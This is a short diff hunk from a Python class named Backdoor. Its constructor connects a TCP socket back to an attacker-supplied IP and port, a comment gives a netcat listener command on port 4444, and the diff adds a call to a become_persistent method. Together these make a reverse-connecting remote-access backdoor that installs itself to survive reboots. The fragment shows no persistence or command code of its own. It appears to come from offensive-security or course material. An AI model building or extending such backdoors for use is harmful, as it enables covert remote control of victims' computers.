@@ -7,6 +7,7 @@ class Backdoor:
 	def __init__(self, ip, port):
 		# nc -vv -l -p 4444
 		# establish connection
+		self.become_persistent()
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((ip, port))
 
